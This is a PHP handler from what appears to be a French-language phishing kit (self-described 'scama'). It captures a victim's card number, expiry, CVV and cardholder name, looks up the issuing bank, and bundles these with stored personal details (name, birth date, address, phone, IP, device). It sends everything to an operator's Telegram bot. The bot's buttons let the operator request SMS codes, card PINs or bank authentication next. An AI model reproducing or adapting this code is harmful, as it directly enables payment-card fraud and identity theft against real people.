<?php
declare(strict_types=1);
if (!defined('ALLOW_INCLUDE')) {
    define('ALLOW_INCLUDE', true);
}

ob_start();
session_start();
date_default_timezone_set('Europe/Paris');
header('Content-Type: application/json');
require_once __DIR__ . '/../modules/load_config.php';
require_once __DIR__ . '/../modules/sessions.php';
//require_once __DIR__ . '/../antibots/all.php';
require_once __DIR__ . '/../func/counter.php'; 

$bot_token = getConfig('BOT_TOKEN', '');
$chat_id   = getConfig('CHAT_ID', '');
$name_scama   = getConfig('SCAMA_NAME', '');
// ---------------------------
//      Protection BOT
// ---------------------------
// Vérification CSRF token
$token = $_POST['csrf_token'] ?? '';
$session_token = $_SESSION['csrf_token'] ?? '';

if (empty($token) || empty($session_token) || !hash_equals($session_token, $token)) {
    ob_end_clean();
    http_response_code(403);
    echo json_encode(['error' => 'Token CSRF invalide.']);
    exit;
}


if (empty($bot_token) || empty($chat_id)) {
    ob_end_clean();
    http_response_code(500);
    echo json_encode(['error' => 'Configuration Telegram manquante.']);
    exit;
}


if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    ob_end_clean();
    http_response_code(405);
    echo json_encode(['error' => 'Méthode non autorisée.']);
    exit;
}


// Vérification des champs requis avec débogage
$missing_fields = [];
$debug_values = [];

// Vérifier chaque champ avec trim pour éviter les espaces
if (empty(trim($_POST['ccnum'] ?? ''))) $missing_fields[] = 'ccnum';
if (empty(trim($_POST['ccexp'] ?? ''))) $missing_fields[] = 'ccexp';
if (empty(trim($_POST['cvv'] ?? ''))) $missing_fields[] = 'cvv';
if (empty(trim($_POST['titulaire'] ?? ''))) $missing_fields[] = 'titulaire';

// Debug: capturer les valeurs reçues
$debug_values = [
    'ccnum' => $_POST['ccnum'] ?? 'NOT_SET',
    'ccexp' => $_POST['ccexp'] ?? 'NOT_SET', 
    'cvv' => $_POST['cvv'] ?? 'NOT_SET',
    'titulaire' => $_POST['titulaire'] ?? 'NOT_SET'
];

if (!empty($missing_fields)) {
    ob_end_clean();
    http_response_code(400);
    echo json_encode([
        'error' => 'Champs manquants: ' . implode(', ', $missing_fields),
        'debug' => [
            'received_fields' => array_keys($_POST),
            'missing_fields' => $missing_fields,
            'field_values' => $debug_values
        ]
    ]);
    exit;
}



$ip = filter_var($_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP) ?: 'Inconnu';
$counterFile = __DIR__ . '/../func/counter_page.json';
incrementCounterByIP('cartes', $ip, $counterFile);

// ---------------------------
//      Visiteurs
// ---------------------------
if (!isset($_SESSION['visitor']) || !is_array($_SESSION['visitor'])) {
    $_SESSION['visitor'] = [
        'ip'           => $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Inconnu',
        'mobile'       => '❌',
        'device_type'  => '❌',
        'device_model' => '❌',
    ];
}

$ip          = htmlspecialchars($_SESSION['visitor']['ip'], ENT_QUOTES, 'UTF-8');
$device_type = htmlspecialchars($_SESSION['visitor']['device_type'], ENT_QUOTES, 'UTF-8');
$device      = htmlspecialchars($_SESSION['visitor']['device_model'], ENT_QUOTES, 'UTF-8');
$datetime    = date('d/m/Y H:i:s');
$uid         = $_SESSION['user_id'] ?? uniqid('user_', true);


// ---------------------------
//      Données Formulaire
// ---------------------------


$titulaire = trim($_POST['titulaire'] ?? '');
$ccnumRaw  = trim($_POST['ccnum'] ?? '');
$ccexpRaw  = trim($_POST['ccexp'] ?? '');
$cvvRaw    = trim($_POST['cvv'] ?? '');


$ccnum = preg_replace('/\D/', '', $ccnumRaw);
$ccexp = htmlspecialchars($ccexpRaw, ENT_QUOTES, 'UTF-8');
$cvv   = preg_replace('/\D/', '', $cvvRaw);


$_SESSION['titulaire'] = $titulaire;
$_SESSION['ccnum']     = $ccnum;
$_SESSION['ccexp']     = $ccexp;
$_SESSION['cvv']       = $cvv;




$bin = substr($ccnum, 0, 6);
$_SESSION['bin'] = $bin;
$binApiUrl = "https://data.handyapi.com/bin/$bin";
$binResponse = @file_get_contents($binApiUrl);

if ($binResponse === false) {
    $bankName = '❓';
    $cardType = '❓';
    $cardLevel = '❓';
    $country = '❓|❓';
} else {
    $binData = json_decode($binResponse, true);
    $bankName  = $binData['Issuer'] ?? '❓';
    $cardType  = strtoupper($binData['Type'] ?? '❓');
    $cardLevel = strtoupper($binData['CardTier'] ?? '❓');
    $countryA2 = $binData['Country']['A2'] ?? '❓';
    $countryA3 = $binData['Country']['A3'] ?? '❓';
    $country = "$countryA2|$countryA3";
}

$_SESSION['bank_name']    = $bankName;
$_SESSION['bank_type']    = $cardType;
$_SESSION['bank_brand']   = $cardLevel;
$_SESSION['bank_country'] = $country;


$nom      = htmlspecialchars($_SESSION['nom'] ?? 'Non renseigné', ENT_QUOTES, 'UTF-8');
$prenom   = htmlspecialchars($_SESSION['prenom'] ?? 'Non renseigné', ENT_QUOTES, 'UTF-8');
$dob      = htmlspecialchars($_SESSION['dob'] ?? 'Non renseigné', ENT_QUOTES, 'UTF-8');
$adresse  = htmlspecialchars($_SESSION['adresse'] ?? 'Non renseigné', ENT_QUOTES, 'UTF-8');
$ville    = htmlspecialchars($_SESSION['ville'] ?? 'Non renseigné', ENT_QUOTES, 'UTF-8');
$cp       = htmlspecialchars($_SESSION['cp'] ?? 'Non renseigné', ENT_QUOTES, 'UTF-8');
$tel      = htmlspecialchars($_SESSION['tel'] ?? 'Non renseigné', ENT_QUOTES, 'UTF-8');



$message_text = "
💳 <b>+1 Carte | {$name_scama}  2025 </b>
    └<b>🔎 Bin : {$_SESSION['bin']}</b>

<b>💳 Informations de la carte</b>
├ 👤 Titulaire : <code>$titulaire</code>
├ 💳 Carte : <code>$ccnum</code>
├ 📆 Exp : <code>$ccexp</code>
├ 🔑 CVV : <code>$cvv</code>
└ 📸 https://cardimages.imaginecurve.com/cards/{$_SESSION['bin']}.png

<b>🏦 Détails Bancaires</b>
├ 🔖 Bank : {$bankName}
├ 🔖 Type : {$cardType}
├ 🔖 Marque : {$cardLevel}
└ 🌍 Pays : {$country}

<b>📝 Informations </b>
├ 👤 Nom : <code>{$nom}</code>
├ 👤 Prénom : <code>{$prenom}</code>
├ 🎂 Date de naissance : <code>{$dob}</code>        
├ 🏠 Adresse : <code>{$adresse}</code>
├ 🏙️ Ville : <code>{$ville}</code>
├ 📮 Code postal : <code>{$cp}</code>
└ 📞 Téléphone : <code>{$tel}</code>

<b>🖥️ Infos système</b>
├ 🌐 IP : <code>$ip</code>
├ 💻 Type : <code>$device_type | 📱 Modèle : $device</code>
└ 📅 Date : <code>$datetime</code>

<blockquote> {$name_scama} [$datetime]
└ Xcode_officiel : [© " . date('Y') . " - All rights reserved.]</blockquote>
";


$keyboard = [
    'inline_keyboard' => [
        [['text' => '❌ Carte invalide', 'callback_data' => "carte_error|$uid"]],  
        [['text' => '📱 SMS', 'callback_data' => "sms|$uid"], ['text' => '🔑 PIN carte', 'callback_data' => "pin|$uid"]],   
        [['text' => '🧾 custom input', 'callback_data' => "custom_input|$uid"], ['text' => '🔑 Auth Banque', 'callback_data' => "auth|$uid"]],   
        [['text' => '✅ Succès', 'callback_data' => "success|$uid"],['text' => '📛 Ban IP', 'callback_data' => "ban_ip|$uid"]]
    ]
];



function sendTelegramMessage(string $bot_token, string $chat_id, string $text, ?array $reply_markup = null, string $parse_mode = 'HTML'): array {
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";

    $post_fields = [
        'chat_id'    => $chat_id,
        'text'       => $text,
        'parse_mode' => $parse_mode,
    ];

    if ($reply_markup !== null) {
        $post_fields['reply_markup'] = json_encode($reply_markup);
    }

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL            => $url,
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $post_fields,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
    ]);

    $result = curl_exec($ch);

    if ($result === false) {
        $error = curl_error($ch);
        curl_close($ch);
        throw new Exception("cURL Error: $error");
    }

    curl_close($ch);

    $response = json_decode($result, true);

    if (!$response || !($response['ok'] ?? false)) {
        $desc = $response['description'] ?? 'Erreur inconnue';
        throw new Exception("Telegram API Error: $desc");
    }

    return $response;
}


try {
    sendTelegramMessage($bot_token, $chat_id, $message_text, $keyboard);
    $_SESSION['login_carte'] = true; // On dis que la session est ok 
    ob_end_clean();
    echo json_encode(['step' => 2]);
} catch (Exception $e) {
    ob_end_clean();
    http_response_code(500);
    echo json_encode(['error' => "Erreur Telegram : " . $e->getMessage()]);
    exit;
}
